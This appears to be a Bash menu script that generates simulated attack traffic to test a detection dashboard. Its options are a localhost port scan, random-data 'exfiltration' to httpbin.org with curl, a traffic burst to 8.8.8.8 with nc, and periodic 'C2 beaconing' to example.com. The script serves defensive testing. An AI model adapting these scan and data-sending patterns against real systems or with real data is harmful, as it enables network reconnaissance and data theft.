#!/bin/bash

# Define colors for better display
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m' # No color

# ---------------------------------------------------------------------------
# Traffic Generation Functions (Triggers)
# ---------------------------------------------------------------------------

trigger_port_scan() {
    echo -e "${CYAN}[*] Simulating Port Scan...${NC}"
    # Sends requests to 8 different ports in a short time window
    for port in 22 80 443 3389 8080 8443 21 25; do
        (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null &
    done
    echo "    Access requests sent to 8 ports."
}

trigger_exfiltration() {
    echo -e "${CYAN}[*] Simulating Data Exfiltration...${NC}"
    # Sends 2MB of random data to an external server
    dd if=/dev/urandom bs=1M count=2 2>/dev/null | curl -s -X POST --data-binary @- http://httpbin.org/post >/dev/null &
    echo "    2MB transfer started in the background."
}

trigger_spike() {
    echo -e "${CYAN}[*] Simulating sudden Traffic Spike...${NC}"
    # Sends a 5MB burst to create a bandwidth anomaly (high Z-score)
    (dd if=/dev/urandom bs=1M count=5 2>/dev/null | nc -q1 8.8.8.8 80) &
    echo "    5MB traffic spike sent."
}

trigger_beaconing() {
    echo -e "${CYAN}[*] Simulating C2 Beaconing...${NC}"
    # Creates an exact connection every 10 seconds
    (for i in $(seq 1 10); do curl -s https://example.com -o /dev/null; sleep 10; done) &
    echo "    Background process will contact external server every 10s (~1 min to detect)."
}

trigger_all() {
    trigger_port_scan
    sleep 1
    trigger_exfiltration
    sleep 1
    trigger_spike
    sleep 1
    trigger_beaconing
}

# ---------------------------------------------------------------------------
# Interactive Menu Loop
# ---------------------------------------------------------------------------

while true; do
    echo ""
    echo "========================================="
    echo "  Live Traffic Trigger Menu (Bash)"
    echo "========================================="
    echo "1. Trigger Port Scan"
    echo "2. Trigger Data Exfiltration"
    echo "3. Trigger Traffic Spike"
    echo "4. Trigger C2 Beaconing"
    echo "5. Trigger ALL"
    echo "0. Exit"
    echo "========================================="
    read -p "Select an option (0-5): " choice
    echo ""

    case $choice in
        1) trigger_port_scan ;;
        2) trigger_exfiltration ;;
        3) trigger_spike ;;
        4) trigger_beaconing ;;
        5) trigger_all ;;
        0) echo "Exiting..."; exit 0 ;;
        *) echo "Invalid choice. Please select a number between 0 and 5." ;;
    esac
    
    echo -e "${GREEN}Command executed! Check your main dashboard to see the alert.${NC}"
    read -p "Press Enter to return to the menu..."
done